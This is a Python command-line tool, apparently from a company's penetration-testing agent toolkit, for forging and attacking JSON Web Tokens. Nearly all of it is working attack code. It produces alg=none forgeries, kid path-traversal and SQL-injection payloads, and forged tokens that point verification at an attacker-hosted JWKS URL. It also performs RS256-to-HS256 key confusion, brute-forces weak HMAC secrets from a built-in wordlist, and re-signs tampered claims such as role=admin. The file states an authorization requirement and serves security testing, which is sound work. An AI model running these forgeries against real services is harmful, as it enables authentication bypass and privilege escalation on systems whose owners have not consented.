#!/usr/bin/env python3
"""jwt_tool.py — original, owned JWT inspection/manipulation for pen_test.

Not a wrapper around any third-party jwt-cli. Implements the checks
described in knowledge/authn_jwt_session.md directly against PyJWT
(a standard library dependency, not vendored tool source).

AUTHORIZATION: only use against a token/target you own or have explicit
permission to test. This is a Company OS pen_test capability — see
agents/pen_test.md's authorization gate.

Usage:
    python3 jwt_tool.py decode <token>
    python3 jwt_tool.py alg-none <token>
    python3 jwt_tool.py kid-inject <token> --kid "../../dev/null" --secret ""
    python3 jwt_tool.py jku-forge <token> --jwks-url https://attacker/jwks.json
    python3 jwt_tool.py forge-hs256 <token> --public-key <path>   # RS256->HS256 confusion
    python3 jwt_tool.py crack <token> [--wordlist <path>]
    python3 jwt_tool.py tamper <token> --claim role=admin --secret <secret>
"""

from __future__ import annotations

import argparse
import base64
import json
import sys

try:
    import jwt as pyjwt
except ImportError:
    print("Missing dependency: pip install -r requirements.txt", file=sys.stderr)
    sys.exit(1)

DEFAULT_WORDLIST = [
    "secret", "changeme", "password", "your-256-bit-secret", "supersecret",
    "jwt_secret", "jwtsecret", "key", "test", "development", "", "12345678",
    "qwertyuiop", "secretkey", "mysecret",
]


def _b64_decode_segment(seg: str) -> bytes:
    seg += "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg)


def decode(token: str) -> None:
    header_b64, payload_b64, _sig = token.split(".")
    header = json.loads(_b64_decode_segment(header_b64))
    payload = json.loads(_b64_decode_segment(payload_b64))
    print("HEADER: ", json.dumps(header, indent=2))
    print("PAYLOAD:", json.dumps(payload, indent=2))
    for claim, note in (
        ("exp", "no expiry claim — token may never expire"),
        ("aud", "no audience claim — token may be replayable across services"),
        ("iss", "no issuer claim — token origin isn't pinned"),
    ):
        if claim not in payload:
            print(f"  [!] {note}")
    # Attack surface in the header itself.
    alg = str(header.get("alg", "")).upper()
    if alg in ("NONE", ""):
        print("  [!] alg is none/empty — try `alg-none`.")
    if alg.startswith("HS"):
        print("  [!] symmetric alg (HS*) — try `crack` (weak secret) and, if the service also"
              " issues RS256, the RS256->HS256 confusion via `forge-hs256`.")
    if alg.startswith("RS") or alg.startswith("ES"):
        print("  [!] asymmetric alg — if you can obtain the public key, try `forge-hs256` (key confusion).")
    for h, attack in (("kid", "`kid-inject` (path traversal / SQLi / predictable-key confusion)"),
                      ("jku", "`jku-forge` (point verification at an attacker-hosted JWKS)"),
                      ("x5u", "`jku-forge --header x5u` (attacker-hosted cert chain)"),
                      ("jwk", "embedded JWK — server may trust a self-supplied key; forge with your own")):
        if h in header:
            print(f"  [!] header carries `{h}={header[h]!r}` — try {attack}.")




def _encode(header: dict, payload: dict, key: bytes, alg: str) -> str:
    """Manual JWS compact serialization (lets us set arbitrary headers)."""
    import hashlib
    import hmac

    def seg(obj) -> str:
        return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()

    signing_input = f"{seg(header)}.{seg(payload)}".encode()
    if alg.upper() == "NONE":
        sig = b""
    elif alg.upper() == "HS256":
        sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    else:
        raise ValueError(f"_encode only handles none/HS256, got {alg}")
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{signing_input.decode()}.{sig_b64}"


def alg_none_variants(token: str) -> None:
    header_b64, payload_b64, _sig = token.split(".")
    header = json.loads(_b64_decode_segment(header_b64))
    payload = json.loads(_b64_decode_segment(payload_b64))
    print("alg=none forgeries (some verifiers only string-match 'none' case-sensitively):")
    for variant in ("none", "None", "NONE", "nOnE"):
        h = dict(header, alg=variant)
        print(f"  [{variant}] {_encode(h, payload, b'', 'none')}")
    print("\nAccepting ANY of these = the server does not verify signatures. Critical.")


def kid_inject(token: str, kid: str, secret: str) -> None:
    """Forge a token whose `kid` steers key selection to something we control.

    Classic bypasses: kid path-traversal to a predictable file whose contents
    we can guess/control (e.g. '../../../../dev/null' -> empty key, sign HS256
    with ''), or SQLi in kid that makes the key lookup return an attacker value.
    """
    header_b64, payload_b64, _sig = token.split(".")
    header = json.loads(_b64_decode_segment(header_b64))
    payload = json.loads(_b64_decode_segment(payload_b64))
    header["kid"] = kid
    header["alg"] = "HS256"
    forged = _encode(header, payload, secret.encode(), "HS256")
    print(f"Forged token: kid={kid!r}, signed HS256 with {secret!r}")
    print(forged)
    print("\nTry-list for `kid` if you don't know the key store shape:")
    for k in ("../../../../../../dev/null", "/dev/null", "' UNION SELECT 'AAAA'-- -", "0", "1"):
        print(f"  kid={k!r} (sign with the value that lookup would return: '' for /dev/null)")


def jku_forge(token: str, jwks_url: str, header_name: str = "jku") -> None:
    """Forge an RS256 token + matching JWKS so a verifier that fetches the
    key from a token-controlled URL trusts our key. Emits both the token
    header/payload and a JWKS you host at `jwks_url`."""
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
    except ImportError:
        print("Needs `cryptography` (pip install cryptography). Skipping key generation.")
        print(f"Manual: generate an RSA keypair, host its JWKS at {jwks_url}, set header {header_name}={jwks_url},")
        print("sign the token with your private key. If the server fetches the JWKS from the token, it trusts you.")
        return
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    header_b64, payload_b64, _sig = token.split(".")
    payload = json.loads(_b64_decode_segment(payload_b64))
    kid = "pentest-forged-key"
    headers = {header_name: jwks_url, "kid": kid}
    forged = pyjwt.encode(payload, key, algorithm="RS256", headers=headers)
    pub = key.public_key().public_numbers()

    def b64u(n: int) -> str:
        raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    jwks = {"keys": [{"kty": "RSA", "kid": kid, "use": "sig", "alg": "RS256",
                      "n": b64u(pub.n), "e": b64u(pub.e)}]}
    print(f"Forged RS256 token (header {header_name}={jwks_url}):")
    print(forged)
    print(f"\nHost this JWKS at {jwks_url} :")
    print(json.dumps(jwks, indent=2))
    print("\nIf the verifier fetches keys from the token-supplied URL without an allow-list, it accepts this. Critical.")


def forge_hs256(token: str, public_key_path: str) -> None:
    _header_b64, payload_b64, _sig = token.split(".")
    header = json.loads(_b64_decode_segment(_header_b64))
    payload = json.loads(_b64_decode_segment(payload_b64))
    with open(public_key_path, "rb") as f:
        public_key_pem = f.read()
    # NOTE: pyjwt.encode() refuses a PEM/public-key value as an HMAC secret
    # (InvalidKeyError) — which is exactly the RS256->HS256 confusion input
    # this command exists to produce. Sign manually with the raw PEM bytes as
    # the HMAC key, which is what a vulnerable verifier will re-derive.
    header["alg"] = "HS256"
    forged = _encode(header, payload, public_key_pem, "HS256")
    print("Forged HS256 token (RS256 public key used as HMAC secret):")
    print(forged)
    print("\nOnly works if verification code doesn't pin the expected algorithm.")
    print("If it's rejected, try the public key in its other on-the-wire forms too:")
    print("  - with/without a trailing newline, and the exact bytes the JWKS n/e reconstruct to.")


def crack(token: str, wordlist_path: str | None) -> None:
    words = DEFAULT_WORDLIST
    if wordlist_path:
        with open(wordlist_path, encoding="utf-8") as f:
            words = [line.strip() for line in f if line.strip()]
    # Verify the SIGNATURE only. Real tokens almost always carry exp/aud/iss,
    # and pyjwt.decode() validates those by default — so the CORRECT secret on
    # an expired token would raise ExpiredSignatureError (a PyJWTError) and be
    # silently skipped, reporting "no match" against a secret that in fact works.
    verify_opts = {
        "verify_signature": True,
        "verify_exp": False,
        "verify_nbf": False,
        "verify_iat": False,
        "verify_aud": False,
        "verify_iss": False,
    }
    for word in words:
        try:
            pyjwt.decode(token, word, algorithms=["HS256"], options=verify_opts)
        except pyjwt.InvalidSignatureError:
            continue
        except pyjwt.PyJWTError:
            # Signature matched but some other check we didn't disable tripped;
            # the secret is still correct. Treat non-signature errors as a hit.
            print(f"MATCH: secret = {word!r} (signature valid; a non-signature claim check also fired)")
            return
        else:
            print(f"MATCH: secret = {word!r}")
            return
    print(f"No match in {len(words)} candidates. Extend the wordlist for a real attempt.")


def tamper(token: str, claim_kvs: list[str], secret: str) -> None:
    _header_b64, payload_b64, _sig = token.split(".")
    payload = json.loads(_b64_decode_segment(payload_b64))
    changed = []
    for kv in claim_kvs:
        key, _, value = kv.partition("=")
        # cast obvious ints/bools so role=1 / admin=true behave as expected
        if value.lower() in ("true", "false"):
            payload[key] = value.lower() == "true"
        elif value.lstrip("-").isdigit():
            payload[key] = int(value)
        else:
            payload[key] = value
        changed.append(f"{key}={payload[key]!r}")
    forged = pyjwt.encode(payload, secret, algorithm="HS256")
    print(f"Tampered token ({', '.join(changed)}), signed with provided secret:")
    print(forged)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = parser.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("decode")
    p.add_argument("token")

    p = sub.add_parser("alg-none")
    p.add_argument("token")

    p = sub.add_parser("kid-inject", help="forge with a malicious kid (path traversal / SQLi / key confusion)")
    p.add_argument("token")
    p.add_argument("--kid", required=True)
    p.add_argument("--secret", default="", help="the key value the kid lookup would return ('' for /dev/null)")

    p = sub.add_parser("jku-forge", help="forge RS256 + JWKS for a token-controlled key URL")
    p.add_argument("token")
    p.add_argument("--jwks-url", required=True, help="attacker-hosted JWKS URL to embed")
    p.add_argument("--header", default="jku", choices=["jku", "x5u"])

    p = sub.add_parser("forge-hs256")
    p.add_argument("token")
    p.add_argument("--public-key", required=True)

    p = sub.add_parser("crack")
    p.add_argument("token")
    p.add_argument("--wordlist")

    p = sub.add_parser("tamper")
    p.add_argument("token")
    p.add_argument("--claim", required=True, action="append", help="key=value (repeatable)")
    p.add_argument("--secret", required=True)

    args = parser.parse_args()
    if args.cmd == "decode":
        decode(args.token)
    elif args.cmd == "alg-none":
        alg_none_variants(args.token)
    elif args.cmd == "kid-inject":
        kid_inject(args.token, args.kid, args.secret)
    elif args.cmd == "jku-forge":
        jku_forge(args.token, args.jwks_url, args.header)
    elif args.cmd == "forge-hs256":
        forge_hs256(args.token, args.public_key)
    elif args.cmd == "crack":
        crack(args.token, args.wordlist)
    elif args.cmd == "tamper":
        tamper(args.token, args.claim, args.secret)


if __name__ == "__main__":
    main()
